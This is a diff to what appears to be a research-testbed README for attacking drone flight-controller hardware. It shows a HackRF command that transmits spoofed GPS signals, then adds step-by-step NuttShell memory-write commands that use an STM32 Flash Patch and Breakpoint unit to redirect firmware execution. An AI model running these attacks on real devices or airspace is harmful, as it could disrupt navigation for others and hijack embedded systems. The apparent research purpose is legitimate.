@@ -29,3 +29,21 @@ sudo apt-get install -y hackrf
 ```bash
 hackrf_transfer -t gpssim.bin -f 1575420000 -s 2600000 -a 1 -x 0
 ```
+
+## FPB (Flash Patch and Breakpoint Unit) attack
+### Prerequisite
+1) Your main system-on-Chip must be equipped with a FPB unit. We used <a href="https://www.st.com/en/microcontrollers-microprocessors/stm32f427-437.html" target="_blank">STM32F427</a>.
+
+### How to execute it?
+1) Connect NSH (NuttShell) on a command window
+```bash
+module load nsh
+nsh start
+```
+2) Activate the FPB unit and execute a new command
+```bash
+mw 0xE0002004=0x20000000 1
+mh 0x20000014=0xe7fe 1
+mw 0xE0002000=0x1 1
+mw 0xE000201C=0x0807efb9 1
+```
